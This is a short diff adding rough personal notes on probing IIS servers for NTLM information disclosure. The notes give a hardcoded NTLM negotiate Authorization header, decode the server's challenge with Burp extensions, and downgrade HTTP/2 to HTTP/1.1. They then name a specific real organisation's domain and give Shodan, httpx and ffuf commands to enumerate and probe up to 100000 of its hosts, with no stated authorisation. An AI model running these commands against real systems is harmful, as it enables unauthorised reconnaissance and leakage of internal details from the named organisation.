@@ -1,0 +1,38 @@
+NTLM Vulnerability
+
+Check wappalyzer NTLM Security  window server use  iis
+
+burb extension  challenge
+ 
+NTLM  endpoint 
+
+/sif
+other
+
+pop ip and password  if fill id and password chec purb 
+
+ADD HEADER
+
+
+Authorization: NTLM TIRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAA=
+
+
+
+Authorization Header and respone auntheticate:Ntlm ewfjsfsfsfs=
+
+this decode ewfjsfsfsfs=   burb extension  NTLM Challenge Decoder  check response ssp decoder
+
+HttP/2  use to downgrade HttP/1.1
+
+chipsoft.nl
+
+
+Shordan 
+
+shodan download --limit 100000 chip 'hostname:"chipsoft.nl"'
+
+
+cat ips.txt | httpx --random-agent --status-code --title -server -td -cl -fc 400
+
+
+FFUF -U 'http://FUZZ' -w ips.txt -v -mc 401
